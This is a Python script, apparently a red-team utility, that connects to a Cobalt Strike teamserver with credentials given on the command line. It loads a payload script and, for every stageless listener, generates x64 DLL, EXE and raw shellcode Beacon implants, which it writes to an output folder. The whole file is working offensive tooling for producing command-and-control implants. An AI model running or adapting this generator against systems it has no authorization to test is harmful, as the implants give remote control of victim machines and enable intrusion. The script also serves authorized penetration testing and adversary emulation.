#!/usr/local/bin/python3
from os import linesep
from sleep_python_bridge.striker import ArtifactType, CSConnector

from argparse import ArgumentParser
from pprint import pp, pprint
from pathlib import Path, PurePath
import json
import time
####################
## Variables

# hostPayload
hostPayload = False

# JSON file
datafile = "payloads.json"

# payloadpath
payloadPath = "output/payloads/"

####################
## FUNCTIONS
def parseArguments():
    parser = ArgumentParser()
    parser.add_argument('host', help='The teamserver host.')
    parser.add_argument('port', help='The teamserver port.')
    parser.add_argument('username', help='The desired username.')
    parser.add_argument('password', help='The teamserver password.')
    parser.add_argument('path', help="Directory to CobaltStrike")
    
    args = parser.parse_args()
    return args


def write_payload(payloadPath,payloadName,payloadBytes,hostPayload=hostPayload):

    filename = PurePath(payloadPath,payloadName)
    with open(filename, 'wb') as file:
        file.write(payloadBytes)

def main(args):

    cs_host = args.host
    cs_port = args.port
    cs_user = args.username
    cs_pass = args.password
    cs_directory = args.path

    ####################
    ## Connect to server
    print(f"[*] Connecting to teamserver: {cs_host}")
    with CSConnector(
        cs_host=cs_host, 
        cs_port=cs_port, 
        cs_user=cs_user, 
        cs_pass=cs_pass,
        cs_directory=cs_directory) as cs:

        listeners = cs.get_listeners_stageless()

        # Load external scripts (if desired)
        script_name = "payload_scripts.cna"
        script_path = Path(script_name).resolve()

        cs.ag_load_script(script_path.name)
        time.sleep(3) # Allow time for the script to load
        print(f"[*] Loaded {script_name} kit with ag_load_script")

        for listener in listeners:
            print(f"[*] Creating payloads for listener: {listener}")

            # x64 dll
            payloadName = f"{listener}.x64.dll"
            print(f"[*] Creating {payloadName}")
            payloadBytes = cs.generatePayload(listener,ArtifactType.DLL,False,True)
            write_payload(payloadPath,payloadName,payloadBytes,hostPayload)

            # x64 exe
            payloadName = f"{listener}.x64.exe"
            print(f"[*] Creating {payloadName}")
            payloadBytes = cs.generatePayload(listener,ArtifactType.EXE,False,True)
            write_payload(payloadPath,payloadName,payloadBytes,hostPayload)

            # x64 bin
            payloadName = f"{listener}.x64.bin"
            print(f"[*] Creating {payloadName}")
            payloadBytes = cs.generatePayload(listener,ArtifactType.RAW,False,True)
            write_payload(payloadPath,payloadName,payloadBytes,hostPayload)

    #########

if __name__ == "__main__":
    print("------------------------")
    print("Beacon Payload Generator")
    print("------------------------")
    args = parseArguments()
    main(args)